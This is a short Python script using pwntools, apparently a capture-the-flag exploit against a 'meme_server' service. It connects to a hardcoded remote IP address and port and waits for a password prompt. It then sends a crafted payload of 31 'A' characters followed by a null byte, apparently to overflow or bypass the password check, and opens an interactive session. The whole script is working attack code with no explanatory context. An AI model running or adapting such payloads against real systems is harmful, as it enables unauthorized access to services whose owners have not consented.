from pwn import *

# r = process('./meme_server')

host = "185.66.87.233"
port = 5004 
r = remote(host, port)

gdb.attach(r, ''' 
''') 

r.recvuntil('password:')

payload = ''
payload += 'A' * 31
payload += '\x00'
r.sendline(payload)

r.interactive()
r.close() 
